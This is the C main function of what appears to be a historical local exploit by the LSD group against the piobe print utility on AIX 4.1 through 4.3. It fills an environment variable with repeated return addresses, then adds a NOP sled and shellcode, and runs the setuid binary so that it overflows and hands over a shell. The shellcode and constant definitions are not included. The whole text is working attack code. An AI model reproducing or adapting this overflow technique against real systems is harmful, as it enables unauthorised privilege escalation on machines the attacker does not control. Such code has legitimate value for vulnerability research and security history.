main(int argc,char **argv,char **e){
    char buffer[20000],adr[4],*b,*envp[4];
    int i,align;

    printf("copyright LAST STAGE OF DELIRIUM dec 2000 poland  //lsd-pl.net/\n");
    printf("/usr/lib/lpd/piobe for aix 4.1 4.2 4.3 4.3.x PowerPC/POWER\n\n");

    if(argc<2){
        printf("usage: %s 41|42|43|433\n",argv[0]);exit(-1);
    }

    switch(atoi(argv[1])){
    case  41: shellcode[55]=0x03;align=2; break;
    case  42: shellcode[55]=0x02;align=0; break;
    case  43: shellcode[55]=0x04;align=0; break;
    case 433: shellcode[55]=0x03;align=0; break;
    default: exit(-1);
    }

    i=0; while(*e++) i+=strlen(*e)+1;
    *((unsigned long*)adr)=(unsigned long)e+(i&~3)-8000;

    envp[0]="PIOSTATUSFILE=lsd";
    envp[1]=buffer;
    envp[2]=&buffer[3500];
    envp[3]=0;

    b=buffer;
    strcpy(b,"PIOVARDIR=");b+=10;
    for(i=0;i<align;i++) *b++=' ';
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    *b=0;

    b=&buffer[3500];
    sprintf(b,"xxx=");b+=4;
    for(i=0;i<3-align;i++) *b++=' ';
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];

    execle("/usr/lib/lpd/piobe","lsd",0,envp);
}